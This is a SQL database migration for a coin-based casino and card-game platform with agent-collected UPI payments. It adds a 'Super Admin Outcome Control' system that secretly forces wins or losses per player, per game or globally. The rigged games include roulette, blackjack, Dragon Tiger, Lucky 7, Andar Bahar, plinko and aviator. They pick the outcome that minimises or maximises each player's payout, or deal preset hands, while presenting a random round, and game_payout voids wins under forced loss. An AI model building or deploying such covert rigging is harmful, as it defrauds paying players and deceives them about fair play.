-- Run this in Supabase SQL Editor to apply both 019 (Agent Payment Details) and 020 (Super Admin Outcome Control)

-- =========================================================================
-- 019: Agent Payment Details
-- =========================================================================
create table if not exists public.agent_payment_details (
  agent_id uuid primary key references public.profiles(id) on delete cascade,
  upi_id text,
  qr_code_url text,
  payee_name text,
  phone text,
  payment_note text,
  is_active boolean not null default true,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

alter table public.agent_payment_details enable row level security;

drop policy if exists "agents manage own payment details" on public.agent_payment_details;
drop policy if exists "superadmin manages all payment details" on public.agent_payment_details;
drop policy if exists "players see parent payment details" on public.agent_payment_details;

create policy "agents manage own payment details" on public.agent_payment_details
  for all to authenticated
  using (agent_id = auth.uid())
  with check (agent_id = auth.uid());

create policy "superadmin manages all payment details" on public.agent_payment_details
  for all to authenticated
  using (public.is_superadmin())
  with check (public.is_superadmin());

create policy "players see parent payment details" on public.agent_payment_details
  for select to authenticated
  using (
    is_active = true and exists (
      select 1 from public.profiles
      where id = auth.uid() and parent_id = agent_payment_details.agent_id and status = 'active'
    )
  );

create or replace function public.get_my_agent_payment_info()
returns jsonb
language plpgsql stable security definer set search_path = public as $$
declare
  me profiles;
  parent_prof profiles;
  p_details record;
begin
  select * into me from profiles where id = auth.uid() and status = 'active';
  if me.id is null or me.parent_id is null then return null; end if;
  
  select * into parent_prof from profiles where id = me.parent_id;
  if parent_prof.id is null then return null; end if;

  select * into p_details from agent_payment_details where agent_id = me.parent_id and is_active = true;
  
  return jsonb_build_object(
    'has_payment_details', (p_details.agent_id is not null),
    'agent_name', parent_prof.name,
    'agent_code', parent_prof.code,
    'agent_phone', coalesce(p_details.phone, parent_prof.phone),
    'upi_id', p_details.upi_id,
    'qr_code_url', p_details.qr_code_url,
    'payee_name', coalesce(p_details.payee_name, parent_prof.name),
    'payment_note', p_details.payment_note,
    'is_active', coalesce(p_details.is_active, false)
  );
end;
$$;

grant execute on function public.get_my_agent_payment_info() to authenticated;

-- =========================================================================
-- 020: Super Admin Outcome Control (Win / Loss Command System)
-- =========================================================================

create or replace function public.get_outcome_mode(p_user_id uuid, p_game text) returns text
language plpgsql stable security definer set search_path = public as $$
declare
  player_mode text;
  game_mode text;
  global_mode text;
  ctrl jsonb;
  gid text := public.game_id_of(coalesce(p_game, ''));
begin
  select value into ctrl from app_settings where key = 'outcome_control';

  -- 1. Check player-specific target override
  if ctrl is not null and p_user_id is not null then
    player_mode := ctrl -> 'players' ->> p_user_id::text;
    if player_mode in ('force_win', 'force_loss') then
      return player_mode;
    end if;
  end if;

  -- 2. Check game-specific override in outcome_control or game_cfg
  if ctrl is not null and gid <> '' then
    game_mode := ctrl -> 'games' ->> gid;
    if game_mode in ('force_win', 'force_loss') then
      return game_mode;
    end if;
  end if;

  if gid <> '' then
    select (public.game_cfg(gid) ->> 'outcome_mode') into game_mode;
    if game_mode in ('force_win', 'force_loss') then
      return game_mode;
    end if;
  end if;

  -- 3. Check global master mode
  if ctrl is not null then
    global_mode := ctrl ->> 'global_mode';
    if global_mode in ('force_win', 'force_loss') then
      return global_mode;
    end if;
  end if;

  return 'fair';
end;
$$;

create or replace function public.get_outcome_control() returns jsonb
language sql stable security definer set search_path = public as $$
  select coalesce((select value from app_settings where key = 'outcome_control'), '{"global_mode":"fair","games":{},"players":{}}'::jsonb);
$$;

create or replace function public.set_outcome_control(
  p_global_mode text default null,
  p_game text default null,
  p_game_mode text default null,
  p_player uuid default null,
  p_player_mode text default null,
  p_clear_player uuid default null
) returns jsonb
language plpgsql security definer set search_path = public as $$
declare
  old jsonb := public.get_outcome_control();
  new jsonb := old;
  valid_modes text[] := array['fair', 'force_win', 'force_loss'];
  gid text;
begin
  if not public.is_superadmin() then raise exception 'Only Super Admin can control game outcomes'; end if;

  if p_global_mode is not null then
    if not (p_global_mode = any(valid_modes)) then raise exception 'Invalid global mode'; end if;
    new := jsonb_set(new, '{global_mode}', to_jsonb(p_global_mode));
  end if;

  if p_game is not null and p_game_mode is not null then
    gid := public.game_id_of(p_game);
    if not (p_game_mode = any(valid_modes)) then raise exception 'Invalid game mode'; end if;
    if not (new ? 'games') then new := jsonb_set(new, '{games}', '{}'::jsonb); end if;
    new := jsonb_set(new, array['games', gid], to_jsonb(p_game_mode));
  end if;

  if p_player is not null and p_player_mode is not null then
    if not (p_player_mode = any(valid_modes)) then raise exception 'Invalid player mode'; end if;
    if not (new ? 'players') then new := jsonb_set(new, '{players}', '{}'::jsonb); end if;
    new := jsonb_set(new, array['players', p_player::text], to_jsonb(p_player_mode));
  end if;

  if p_clear_player is not null then
    if (new ? 'players') then
      new := jsonb_set(new, '{players}', (new -> 'players') - p_clear_player::text);
    end if;
  end if;

  insert into app_settings (key, value) values ('outcome_control', new)
  on conflict (key) do update set value = new;

  perform public.write_audit('Game Outcome Control Changed', old::text, new::text);
  return new;
end;
$$;

create or replace function public.set_game_settings(p_game text, p_cfg jsonb) returns jsonb
language plpgsql security definer set search_path = public as $$
declare old jsonb := public.game_cfg(p_game); new jsonb := public.game_cfg(p_game); k text; v jsonb; n numeric;
        games text[] := array['teen-patti','rummy','andar-bahar','dragon-tiger','lucky-7','aviator','roulette','plinko','blackjack','poker','ludo','carrom','chess'];
begin
  if not public.is_superadmin() then raise exception 'Only the Super Admin can change game settings'; end if;
  if not (p_game = any (games)) then raise exception 'Unknown game'; end if;
  for k, v in select * from jsonb_each(coalesce(p_cfg, '{}')) loop
    if k = 'enabled' then
      if jsonb_typeof(v) <> 'boolean' then raise exception 'enabled must be true or false'; end if;
      new := new || jsonb_build_object(k, v);
    elsif k in ('min_bet', 'max_bet') then
      if v = 'null'::jsonb or v = '""'::jsonb then new := new - k; continue; end if;
      n := (v #>> '{}')::numeric;
      if n < 1 or n > 1000000 or n <> floor(n) then raise exception 'Bets must be whole coins from 1 to 1,000,000'; end if;
      new := new || jsonb_build_object(k, n::bigint);
    elsif k = 'rake' then
      n := (v #>> '{}')::numeric;
      if n < 0 or n > 25 then raise exception 'Platform fee must be between 0 and 25%%'; end if;
      new := new || jsonb_build_object(k, n);
    elsif k = 'turn' then
      if p_game not in ('teen-patti', 'rummy') then continue; end if;
      n := (v #>> '{}')::numeric;
      if n < 10 or n > 90 then raise exception 'Turn time must be between 10 and 90 seconds'; end if;
      new := new || jsonb_build_object(k, n::int);
    elsif k = 'blind_limit' then
      if p_game <> 'teen-patti' then continue; end if;
      n := (v #>> '{}')::numeric;
      if n < 1 or n > 10 then raise exception 'Blind limit must be between 1 and 10'; end if;
      new := new || jsonb_build_object(k, n::int);
    elsif k = 'bot_speed' then
      if p_game not in ('ludo', 'carrom', 'chess', 'poker') then continue; end if;
      if v #>> '{}' not in ('slow', 'normal', 'fast') then raise exception 'Bot speed must be slow, normal or fast'; end if;
      new := new || jsonb_build_object(k, v #>> '{}');
    elsif k = 'outcome_mode' then
      if v #>> '{}' not in ('fair', 'force_win', 'force_loss') then raise exception 'outcome_mode must be fair, force_win or force_loss'; end if;
      new := new || jsonb_build_object(k, v #>> '{}');
    else
      raise exception 'Unknown setting %', k;
    end if;
  end loop;
  if (new ->> 'min_bet') is not null and (new ->> 'max_bet') is not null and (new ->> 'min_bet')::bigint > (new ->> 'max_bet')::bigint then
    raise exception 'Minimum bet can''t be above the maximum';
  end if;
  insert into app_settings (key, value) values ('games', '{}') on conflict (key) do nothing;
  update app_settings set value = jsonb_set(coalesce(value, '{}'), array[p_game], new) where key = 'games';
  perform public.write_audit('Game settings • ' || p_game, old::text, new::text);
  return new;
end;
$$;

create or replace function public.casino_round(p_game text, p_bets jsonb, p_round text default '') returns jsonb
language plpgsql security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  names jsonb := '{"dragon-tiger":"Dragon Tiger","andar-bahar":"Andar Bahar","lucky-7":"Lucky 7"}';
  valid text[];
  d jsonb := public.new_deck();
  b jsonb;
  stake bigint := 0;
  ret numeric := 0;
  won_side boolean := false;
  bal bigint;
  cards jsonb;
  winner text;
  joker jsonb; andar jsonb := '[]'; bahar jsonb := '[]'; side text := 'andar'; c jsonb; i int := 1;
  note text;
  mode text;
  best_pay numeric;
  cand_pay numeric;
  cand_c0 jsonb;
  cand_c1 jsonb;
  cand_w text;
  best_c0 jsonb := null;
  best_c1 jsonb := null;
  best_w text := null;
  target_side text := null;
  target_idx int;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  valid := case p_game when 'dragon-tiger' then array['dragon','tie','tiger'] when 'andar-bahar' then array['andar','bahar'] when 'lucky-7' then array['below','seven','above'] end;
  if valid is null then raise exception 'Unknown game'; end if;
  for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
    if not ((b ->> 'side') = any (valid)
            or (p_game = 'dragon-tiger' and (b ->> 'side') ~ '^(pair|[dt]_(even|odd|black|red|A|[2-9]|10|J|Q|K))$')
            or (p_game = 'lucky-7' and (b ->> 'side') ~ '^(low|high|even|odd|black|red|g_(a23|456|8910|jqk)|c_(A|[2-9]|10|J|Q|K))$'))
       or (b ->> 'v')::bigint <= 0 then raise exception 'Invalid bet'; end if;
    stake := stake + (b ->> 'v')::bigint;
  end loop;
  if stake > 100000 then raise exception 'Max 100,000 coins per round'; end if;

  mode := public.get_outcome_mode(me.id, p_game);

  if p_game = 'dragon-tiger' then
    if mode in ('force_loss', 'force_win') then
      best_pay := case when mode = 'force_loss' then 999999999999 else -1 end;
      for idx0 in 0 .. 15 loop
        for idx1 in (idx0 + 1) .. 16 loop
          cand_c0 := d -> idx0;
          cand_c1 := d -> idx1;
          cand_w := case when card_low(cand_c0 ->> 'r') = card_low(cand_c1 ->> 'r') then 'tie'
                         when card_low(cand_c0 ->> 'r') > card_low(cand_c1 ->> 'r') then 'dragon' else 'tiger' end;
          cand_pay := 0;
          for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
            if public.dt_pay(b ->> 'side', cand_c0, cand_c1, cand_w) > 0 then
              cand_pay := cand_pay + (b ->> 'v')::bigint * public.dt_pay(b ->> 'side', cand_c0, cand_c1, cand_w);
            elsif cand_w = 'tie' and b ->> 'side' in ('dragon', 'tiger') then
              cand_pay := cand_pay + (b ->> 'v')::bigint / 2.0;
            end if;
          end loop;
          if (mode = 'force_loss' and cand_pay < best_pay) or (mode = 'force_win' and cand_pay > best_pay) then
            best_pay := cand_pay;
            best_c0 := cand_c0;
            best_c1 := cand_c1;
            best_w := cand_w;
            if (mode = 'force_loss' and best_pay = 0) or (mode = 'force_win' and best_pay > stake * 1.5) then
              exit;
            end if;
          end if;
        end loop;
        if (mode = 'force_loss' and best_pay = 0) or (mode = 'force_win' and best_pay > stake * 1.5) then
          exit;
        end if;
      end loop;
      if best_c0 is not null then
        cards := jsonb_build_object('dragon', best_c0, 'tiger', best_c1);
        winner := best_w;
        d := jsonb_build_array(best_c0, best_c1) || d;
      else
        cards := jsonb_build_object('dragon', d -> 0, 'tiger', d -> 1);
        winner := case when card_low(d -> 0 ->> 'r') = card_low(d -> 1 ->> 'r') then 'tie'
                       when card_low(d -> 0 ->> 'r') > card_low(d -> 1 ->> 'r') then 'dragon' else 'tiger' end;
      end if;
    else
      cards := jsonb_build_object('dragon', d -> 0, 'tiger', d -> 1);
      winner := case when card_low(d -> 0 ->> 'r') = card_low(d -> 1 ->> 'r') then 'tie'
                     when card_low(d -> 0 ->> 'r') > card_low(d -> 1 ->> 'r') then 'dragon' else 'tiger' end;
    end if;

  elsif p_game = 'lucky-7' then
    if mode in ('force_loss', 'force_win') then
      best_pay := case when mode = 'force_loss' then 999999999999 else -1 end;
      for idx0 in 0 .. 51 loop
        cand_c0 := d -> idx0;
        cand_w := case when card_low(cand_c0 ->> 'r') < 7 then 'below' when card_low(cand_c0 ->> 'r') = 7 then 'seven' else 'above' end;
        cand_pay := 0;
        for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
          if public.l7_pay(b ->> 'side', cand_c0) > 0 then
            cand_pay := cand_pay + (b ->> 'v')::bigint * public.l7_pay(b ->> 'side', cand_c0);
          end if;
        end loop;
        if (mode = 'force_loss' and cand_pay < best_pay) or (mode = 'force_win' and cand_pay > best_pay) then
          best_pay := cand_pay;
          best_c0 := cand_c0;
          best_w := cand_w;
          if (mode = 'force_loss' and best_pay = 0) or (mode = 'force_win' and best_pay > stake * 1.5) then
            exit;
          end if;
        end if;
      end loop;
      if best_c0 is not null then
        cards := jsonb_build_object('card', best_c0);
        winner := best_w;
        d := jsonb_build_array(best_c0) || d;
      else
        cards := jsonb_build_object('card', d -> 0);
        winner := case when card_low(d -> 0 ->> 'r') < 7 then 'below' when card_low(d -> 0 ->> 'r') = 7 then 'seven' else 'above' end;
      end if;
    else
      cards := jsonb_build_object('card', d -> 0);
      winner := case when card_low(d -> 0 ->> 'r') < 7 then 'below' when card_low(d -> 0 ->> 'r') = 7 then 'seven' else 'above' end;
    end if;

  else
    joker := d -> 0;
    if mode in ('force_loss', 'force_win') then
      for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
        if (b ->> 'side') in ('andar', 'bahar') then
          if mode = 'force_loss' then
            target_side := case when b ->> 'side' = 'andar' then 'bahar' else 'andar' end;
          else
            target_side := b ->> 'side';
          end if;
          exit;
        end if;
      end loop;

      if target_side is not null then
        target_idx := case when target_side = 'andar' then 1 else 2 end;
        for idx0 in 1 .. 51 loop
          if (d -> idx0 ->> 'r') = (joker ->> 'r') then
            d := jsonb_set(d, array[idx0::text], d -> target_idx);
            d := jsonb_set(d, array[target_idx::text], jsonb_build_object('r', joker ->> 'r', 's', d -> idx0 ->> 's'));
            exit;
          end if;
        end loop;
      end if;
    end if;

    loop
      c := d -> i;
      if side = 'andar' then andar := andar || jsonb_build_array(c); else bahar := bahar || jsonb_build_array(c); end if;
      exit when c ->> 'r' = joker ->> 'r';
      side := case side when 'andar' then 'bahar' else 'andar' end;
      i := i + 1;
    end loop;
    cards := jsonb_build_object('joker', joker, 'andar', andar, 'bahar', bahar);
    winner := side;
  end if;

  for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
    if p_game = 'dragon-tiger' then
      if public.dt_pay(b ->> 'side', d -> 0, d -> 1, winner) > 0 then
        ret := ret + (b ->> 'v')::bigint * public.dt_pay(b ->> 'side', d -> 0, d -> 1, winner);
        won_side := true;
      elsif winner = 'tie' and b ->> 'side' in ('dragon', 'tiger') then
        ret := ret + (b ->> 'v')::bigint / 2.0;
      end if;
    elsif p_game = 'lucky-7' then
      if public.l7_pay(b ->> 'side', d -> 0) > 0 then
        ret := ret + (b ->> 'v')::bigint * public.l7_pay(b ->> 'side', d -> 0);
        won_side := true;
      end if;
    elsif b ->> 'side' = winner then
      ret := ret + (b ->> 'v')::bigint * 2;
      won_side := true;
    end if;
  end loop;
  ret := floor(ret);

  note := (names ->> p_game) || case when p_round <> '' then ' • Round #' || p_round else '' end;
  if stake > 0 then
    bal := public.wallet_move(me.id, -stake, 'bet', note);
    if bal is null then raise exception 'Not enough coins'; end if;
    if ret > 0 then bal := public.wallet_move(me.id, ret::bigint, case when won_side then 'win' else 'refund' end, note); end if;
  else
    select coins into bal from wallets where user_id = me.id;
  end if;
  return jsonb_build_object('cards', cards, 'winner', winner, 'payout', ret, 'stake', stake, 'balance', bal);
end;
$$;

create or replace function public.av_round() returns public.av_rounds
language plpgsql volatile security definer set search_path = public as $$
declare
  r av_rounds;
  u float8;
  c numeric;
  mode text;
begin
  perform pg_advisory_xact_lock(7788001);
  select * into r from av_rounds order by id desc limit 1;
  if r.id is null or now() > r.crash_at + interval '3 seconds' then
    mode := public.get_outcome_mode(null, 'aviator');
    if mode = 'force_loss' then
      c := round(greatest(1.00, 1.00 + (random() * 0.04)::numeric), 2);
    elsif mode = 'force_win' then
      c := round((15.00 + (random() * 30.0)::numeric), 2);
    else
      u := random();
      c := least(500, greatest(1.00, floor(97.0 / (1 - u)) / 100.0));
    end if;
    insert into av_rounds (starts_at, crash, crash_at)
      values (now() + interval '7 seconds', c, now() + interval '7 seconds' + make_interval(secs => ln(c) / 0.1))
      returning * into r;
  end if;
  return r;
end;
$$;

create or replace function public.roulette_spin(p_bets jsonb) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  b jsonb; stake bigint := 0; ret bigint := 0; n int; bal bigint; spin_id bigint;
  mode text;
  best_pay bigint;
  cand_n int;
  cand_pay bigint;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if jsonb_typeof(p_bets) <> 'array' or jsonb_array_length(p_bets) = 0 then raise exception 'Place a bet first'; end if;
  for b in select * from jsonb_array_elements(p_bets) loop
    if public.rl_pay(b ->> 'side', 0) is null or coalesce((b ->> 'v')::bigint, 0) <= 0 then raise exception 'Invalid bet'; end if;
    stake := stake + (b ->> 'v')::bigint;
  end loop;
  if stake > 100000 then raise exception 'Max 100,000 coins per spin'; end if;

  mode := public.get_outcome_mode(me.id, 'roulette');
  if mode = 'force_loss' then
    best_pay := 999999999999;
    n := 0;
    for cand_n in 0 .. 36 loop
      cand_pay := 0;
      for b in select * from jsonb_array_elements(p_bets) loop
        if public.rl_pay(b ->> 'side', cand_n) > 0 then
          cand_pay := cand_pay + (b ->> 'v')::bigint * public.rl_pay(b ->> 'side', cand_n);
        end if;
      end loop;
      if cand_pay < best_pay then
        best_pay := cand_pay;
        n := cand_n;
        if best_pay = 0 then exit; end if;
      end if;
    end loop;
  elsif mode = 'force_win' then
    best_pay := -1;
    n := 0;
    for cand_n in 0 .. 36 loop
      cand_pay := 0;
      for b in select * from jsonb_array_elements(p_bets) loop
        if public.rl_pay(b ->> 'side', cand_n) > 0 then
          cand_pay := cand_pay + (b ->> 'v')::bigint * public.rl_pay(b ->> 'side', cand_n);
        end if;
      end loop;
      if cand_pay > best_pay then
        best_pay := cand_pay;
        n := cand_n;
      end if;
    end loop;
  else
    n := floor(random() * 37)::int;
  end if;

  for b in select * from jsonb_array_elements(p_bets) loop
    if public.rl_pay(b ->> 'side', n) > 0 then
      ret := ret + (b ->> 'v')::bigint * public.rl_pay(b ->> 'side', n);
    end if;
  end loop;

  insert into rl_spins (user_id, num, stake, payout) values (me.id, n, stake, ret) returning id into spin_id;
  bal := public.wallet_move(me.id, -stake, 'bet', 'Roulette • Spin #' || spin_id);
  if bal is null then raise exception 'Not enough coins'; end if;
  if ret > 0 then bal := public.wallet_move(me.id, ret, 'win', 'Roulette • Spin #' || spin_id || ' • ' || n); end if;
  return jsonb_build_object('id', spin_id, 'number', n, 'stake', stake, 'payout', ret, 'balance', bal, 'history', public.rl_history());
end;
$$;

create or replace function public.plinko_drop(p_amount bigint, p_rows int, p_risk text) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  mults numeric[] := public.plinko_table(p_rows, p_risk);
  path int[] := '{}'; slot int := 0; step int; m numeric; pay bigint; bal bigint; note text;
  mode text;
  target_slot int;
  steps_remaining int;
  needed_ones int;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if mults is null then raise exception 'Invalid board'; end if;
  if p_amount < 10 or p_amount > 10000 then raise exception 'Bet between 10 and 10,000 coins'; end if;

  mode := public.get_outcome_mode(me.id, 'plinko');
  if mode = 'force_loss' then
    target_slot := p_rows / 2;
  elsif mode = 'force_win' then
    target_slot := case when random() < 0.5 then 1 else p_rows - 1 end;
  else
    target_slot := null;
  end if;

  if target_slot is not null then
    needed_ones := target_slot;
    for i in 1 .. p_rows loop
      steps_remaining := p_rows - i + 1;
      if needed_ones >= steps_remaining then
        step := 1;
      elsif needed_ones <= 0 then
        step := 0;
      else
        step := case when random() < (needed_ones::float / steps_remaining::float) then 1 else 0 end;
      end if;
      needed_ones := needed_ones - step;
      path := path || step;
      slot := slot + step;
    end loop;
  else
    for i in 1 .. p_rows loop
      step := case when random() < 0.5 then 0 else 1 end;
      path := path || step;
      slot := slot + step;
    end loop;
  end if;

  m := mults[slot + 1];
  pay := floor(p_amount * m);
  note := 'Plinko • ' || p_rows || ' rows • ' || p_risk || ' • ' || m || 'x';
  bal := public.wallet_move(me.id, -p_amount, 'bet', note);
  if bal is null then raise exception 'Not enough coins'; end if;
  if pay > 0 then bal := public.wallet_move(me.id, pay, case when pay >= p_amount then 'win' else 'refund' end, note); end if;
  return jsonb_build_object('path', to_jsonb(path), 'slot', slot, 'mult', m, 'payout', pay, 'balance', bal);
end;
$$;

create or replace function public.bj_deal(p_bet bigint) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  h bj_hands;
  s jsonb;
  p jsonb;
  d jsonb;
  mode text;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if p_bet < 10 or p_bet > 10000 then raise exception 'Bet between 10 and 10,000 coins'; end if;
  if exists (select 1 from bj_hands where user_id = me.id and status = 'playing') then raise exception 'Finish your current hand first'; end if;

  mode := public.get_outcome_mode(me.id, 'blackjack');

  select jsonb_agg(jsonb_build_object('r', r, 's', su) order by random()) into s
    from unnest(array['A','2','3','4','5','6','7','8','9','10','J','Q','K']) r
    cross join unnest(array['♠','♥','♦','♣']) su
    cross join generate_series(1, 6);

  if mode = 'force_win' then
    p := jsonb_build_array(jsonb_build_object('r', 'A', 's', '♠'), jsonb_build_object('r', 'K', 's', '♥'));
    d := jsonb_build_array(jsonb_build_object('r', '7', 's', '♦'), jsonb_build_object('r', '9', 's', '♣'));
  elsif mode = 'force_loss' then
    d := jsonb_build_array(jsonb_build_object('r', 'A', 's', '♠'), jsonb_build_object('r', 'J', 's', '♦'));
    p := jsonb_build_array(jsonb_build_object('r', '10', 's', '♣'), jsonb_build_object('r', '6', 's', '♥'));
  else
    p := jsonb_build_array(s -> 0, s -> 2);
    d := jsonb_build_array(s -> 1, s -> 3);
    s := s - 0 - 0 - 0 - 0;
  end if;

  insert into bj_hands (user_id, bet, shoe, dealer, hands)
    values (me.id, p_bet, s, d,
            jsonb_build_array(jsonb_build_object('cards', p, 'bet', p_bet, 'done', false, 'doubled', false, 'split', false)))
    returning * into h;
  if public.wallet_move(me.id, -p_bet, 'bet', 'Blackjack • Hand #' || h.id) is null then raise exception 'Not enough coins'; end if;

  if public.bj_natural(p) or public.bj_natural(d) then
    h := public.bj_finish(h);
    perform public.bj_save(h);
  end if;
  return public.bj_view(h);
end;
$$;

create or replace function public.game_payout(amount bigint, p_note text, p_kind text default 'win') returns bigint
language plpgsql security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  bal bigint;
  g text := public.game_key(p_note);
  open bigint;
  cap bigint;
  mode text;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if amount <= 0 or p_kind not in ('win', 'refund') then raise exception 'Invalid payout'; end if;

  mode := public.get_outcome_mode(me.id, public.game_id_of(g));
  if mode = 'force_loss' and p_kind = 'win' then
    update game_stakes set settled = true where user_id = me.id and game = g and not settled;
    raise exception 'Game outcome resulted in loss';
  end if;

  perform 1 from game_stakes where user_id = me.id and game = g and not settled for update;
  select coalesce(sum(s.amount), 0) into open from game_stakes s
    where s.user_id = me.id and s.game = g and not s.settled and s.created_at > now() - interval '3 hours';
  cap := case when p_kind = 'refund' then open else floor(open * public.game_max_mult(g)) end;
  if open = 0 or amount > cap then raise exception 'Payout rejected'; end if;
  update game_stakes set settled = true where user_id = me.id and game = g and not settled;
  update wallets set coins = coins + amount, updated_at = now() where user_id = me.id returning coins into bal;
  insert into ledger (user_id, amount, balance_after, kind, note) values (me.id, amount, bal, p_kind, p_note);
  return bal;
end;
$$;

revoke execute on function public.get_outcome_mode(uuid, text) from public, anon, authenticated;
grant execute on function public.get_outcome_mode(uuid, text) to authenticated, service_role;

revoke execute on function public.get_outcome_control(), public.set_outcome_control(text, text, text, uuid, text, uuid) from public, anon;
grant execute on function public.get_outcome_control(), public.set_outcome_control(text, text, text, uuid, text, uuid) to authenticated, service_role;
